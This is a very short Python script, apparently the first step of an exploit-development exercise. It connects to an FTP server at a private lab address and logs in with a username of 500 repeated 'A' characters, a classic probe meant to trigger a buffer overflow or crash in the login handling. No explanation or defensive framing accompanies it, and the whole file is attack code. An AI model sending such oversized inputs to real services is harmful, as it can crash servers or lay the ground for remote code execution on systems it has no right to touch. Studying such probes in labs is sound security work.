from ftplib import FTP

ip = '192.168.10.128'
username = 'A' * 500
password = '123456'

ftp = FTP(ip)
ftp.login(username, password)
